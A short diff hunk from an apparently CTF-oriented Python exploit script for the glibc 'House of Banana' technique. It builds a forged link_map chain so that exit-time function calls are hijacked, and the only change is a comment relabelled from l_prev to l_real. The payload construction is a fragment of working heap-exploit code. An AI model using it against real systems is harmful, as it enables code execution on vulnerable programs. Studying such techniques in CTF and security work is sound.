@@ -34,7 +34,7 @@ def HOB(call_addr, fake_link_map_addr, _ns_nloaded = 4):
     # 伪造link_map链表
     for i in range(_ns_nloaded):
         payload = payload.ljust(0x28 * i + 0x18, b'\x00') + p64(fake_link_map_addr + 0x28 * (i + 1))# l_next
-        payload = payload.ljust(0x28 * i + 0x28, b'\x00') + p64(fake_link_map_addr + 0x28 * i)      # l_prev
+        payload = payload.ljust(0x28 * i + 0x28, b'\x00') + p64(fake_link_map_addr + 0x28 * i)      # l_real
     payload = payload.ljust(0x110, b'\x00')
     # 调用函数列表指针
     payload += p64(fake_link_map_addr + 0x110) + p64(fake_link_map_addr + 0x130)
